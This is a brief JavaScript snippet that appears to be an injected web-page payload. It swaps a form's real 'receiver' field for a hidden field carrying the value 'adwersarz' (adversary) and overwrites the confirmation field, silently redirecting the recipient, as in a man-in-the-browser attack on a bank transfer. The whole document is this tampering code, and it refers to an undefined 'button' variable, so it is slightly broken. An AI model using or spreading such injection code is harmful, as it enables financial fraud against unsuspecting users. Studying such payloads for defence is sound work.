
var receiver = document.getElementById("receiver")
var receiverconfirm = document.getElementById("receiverconfirm")

if (receiver != null && button != null) {
    receiver.setAttribute("name", "changed not working")
    var newElement = document.createElement("input")
    newElement.value = "adwersarz"
    newElement.setAttribute("type", "hidden")
    newElement.setAttribute("name", "receiver")
    receiver.parentElement.appendChild(newElement)
}

if (receiverconfirm != null) {
    receiverconfirm.value = "jankowalski"
}

